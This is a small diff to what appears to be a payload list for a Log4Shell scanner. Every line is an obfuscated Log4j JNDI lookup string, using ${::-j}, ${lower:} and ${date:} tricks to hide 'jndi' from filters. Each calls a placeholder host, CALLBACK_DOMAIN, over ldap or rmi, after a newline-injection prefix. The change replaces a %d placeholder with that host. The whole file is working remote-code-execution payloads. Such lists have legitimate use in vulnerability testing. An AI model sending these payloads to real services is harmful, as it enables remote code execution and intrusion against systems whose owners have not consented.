@@ -1,6 +1,6 @@
 %%0a${${::-j}${::-n}${::-d}${::-I}:${::-l}${::-d}${::-a}${::-p}://CALLBACK_DOMAIN/payload1}
 %%0a${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}://CALLBACK_DOMAIN/payload5}
-%%0a${${::-j}ndi:rmi://%d/payload14}
+%%0a${${::-j}ndi:rmi://CALLBACK_DOMAIN/payload14}
 %%0a${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://CALLBACK_DOMAIN/payload2}
 %%0a${${lower:${lower:jndi}}:${lower:rmi}://CALLBACK_DOMAIN/payload7}
 %%0a${${lower:jndi}:${lower:rmi}://CALLBACK_DOMAIN/payload6}
